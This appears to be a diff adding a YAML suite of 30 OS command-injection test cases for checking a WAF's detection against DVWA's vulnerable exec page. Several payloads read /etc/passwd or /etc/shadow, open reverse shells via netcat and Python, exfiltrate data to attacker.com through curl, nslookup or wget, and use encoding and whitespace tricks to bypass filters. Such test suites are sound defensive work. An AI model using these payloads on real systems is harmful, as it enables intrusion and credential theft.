@@ -1,0 +1,292 @@
+# =============================================================================
+# Command Injection (OS Command Injection) Test Cases
+# =============================================================================
+# DVWA의 Command Injection 취약점을 통해 WAF의 OS 명령어 삽입 탐지 능력 검증
+# 다양한 명령어 구분자, Blind 주입, WAF 우회 기법 포함
+# =============================================================================
+
+category: "command_injection"
+name: "Command Injection"
+description: "OS Command Injection 공격 탐지 테스트"
+severity: "critical"
+icon: "💻"
+
+tests:
+  # --- 기본 Command Injection (세미콜론) ---
+  - id: "cmd-001"
+    description: "Command Injection - ; id"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; id"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-002"
+    description: "Command Injection - ; cat /etc/passwd"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; cat /etc/passwd"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-003"
+    description: "Command Injection - ; whoami"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; whoami"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "cmd-004"
+    description: "Command Injection - ; ls -la"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; ls -la"
+      Submit: "Submit"
+    severity: "high"
+
+  # --- 파이프 기반 ---
+  - id: "cmd-005"
+    description: "Command Injection - | id"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 | id"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-006"
+    description: "Command Injection - | netstat -an"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 | netstat -an"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "cmd-007"
+    description: "Command Injection - | nc -e /bin/bash attacker.com 4444"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 | nc -e /bin/bash 10.0.0.1 4444"
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- 백틱 및 $() ---
+  - id: "cmd-008"
+    description: "Command Injection - 백틱 `id`"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1`id`"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-009"
+    description: "Command Injection - $(id)"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1$(id)"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-010"
+    description: "Command Injection - $(cat /etc/shadow)"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1$(cat /etc/shadow)"
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- AND / OR 연산자 ---
+  - id: "cmd-011"
+    description: "Command Injection - && id"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 && id"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-012"
+    description: "Command Injection - || id"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 || id"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "cmd-013"
+    description: "Command Injection - & id (백그라운드)"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 & id"
+      Submit: "Submit"
+    severity: "high"
+
+  # --- Blind Command Injection (Time-based) ---
+  - id: "cmd-014"
+    description: "Blind Cmd - && sleep 5"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 && sleep 5"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "cmd-015"
+    description: "Blind Cmd - | ping -c 10 127.0.0.1"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 | ping -c 10 127.0.0.1"
+      Submit: "Submit"
+    severity: "high"
+
+  # --- Out-of-Band Command Injection ---
+  - id: "cmd-016"
+    description: "OOB Cmd - curl dnslog"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; curl http://attacker.com/$(whoami)"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-017"
+    description: "OOB Cmd - DNS exfiltration"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; nslookup $(id).attacker.com"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-018"
+    description: "OOB Cmd - wget data exfil"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1; wget --post-data=$(cat /etc/passwd) http://attacker.com/exfil"
+      Submit: "Submit"
+    severity: "critical"
+
+  # --- 우회 기법 (공백/필터 우회) ---
+  - id: "cmd-019"
+    description: "Cmd Inj - 탭 공백 우회"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;id"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "cmd-020"
+    description: "Cmd Inj - ${IFS} 공백 우회"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;cat${IFS}/etc/passwd"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "cmd-021"
+    description: "Cmd Inj - Hex 인코딩"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;echo 6964 | xxd -r -p | sh"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "cmd-022"
+    description: "Cmd Inj - Base64 인코딩"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;echo 'aWQ=' | base64 -d | sh"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "cmd-023"
+    description: "Cmd Inj - 와일드카드 우회 /???/??????"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;/???/??????"
+      Submit: "Submit"
+    severity: "medium"
+
+  # --- 고급 기법 ---
+  - id: "cmd-024"
+    description: "Cmd Inj - 개행문자 %0a 우회"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1%0aid"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "cmd-025"
+    description: "Cmd Inj - 환경변수 ${HOME}/../etc"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;cat ${HOME}/../etc/passwd"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "cmd-026"
+    description: "Cmd Inj - 대체 쉘 php://"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;php -r 'system(\"id\");'"
+      Submit: "Submit"
+    severity: "high"
+
+  - id: "cmd-027"
+    description: "Cmd Inj - Python 원격 명령"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;python -c 'import socket;s=socket.socket();s.connect((\"10.0.0.1\",4444));import pty;pty.spawn(\"/bin/bash\")'"
+      Submit: "Submit"
+    severity: "critical"
+
+  - id: "cmd-028"
+    description: "Cmd Inj - 다중 명령 체이닝 ;;;"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;;;id;;;whoami"
+      Submit: "Submit"
+    severity: "medium"
+
+  # --- Windows 계열 ---
+  - id: "cmd-029"
+    description: "Cmd Inj - Windows dir (DVWA가 Linux지만 WAF 탐지 확인용)"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1 & dir & whoami"
+      Submit: "Submit"
+    severity: "medium"
+
+  - id: "cmd-030"
+    description: "Cmd Inj - PowerShell 원격 명령"
+    method: "GET"
+    path: "/vulnerabilities/exec/"
+    params:
+      ip: "127.0.0.1;powershell -c \"Invoke-Expression('id')\""
+      Submit: "Submit"
+    severity: "high"
